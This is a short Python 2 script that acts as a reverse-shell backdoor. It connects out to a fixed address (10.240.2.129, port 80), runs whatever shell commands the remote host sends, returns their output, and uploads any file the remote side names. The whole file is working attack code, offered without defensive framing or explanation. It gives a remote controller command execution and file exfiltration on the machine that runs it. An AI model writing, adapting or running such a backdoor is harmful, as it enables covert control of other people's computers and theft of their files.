'''
Created on Nov 23, 2017

@author: kkim
'''
import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find out the file')
        
        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.240.2.129",80))
    
    while True:
        command = s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break
        elif 'download' in command:
            grab, path = command.split('*')
            try:
                transfer(s, path)
            except Exception,e:
                s.send(str(e))
                pass
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send (CMD.stdout.read())
            s.send (CMD.stderr.read())
            
            

def main():
    connect()
    
main()

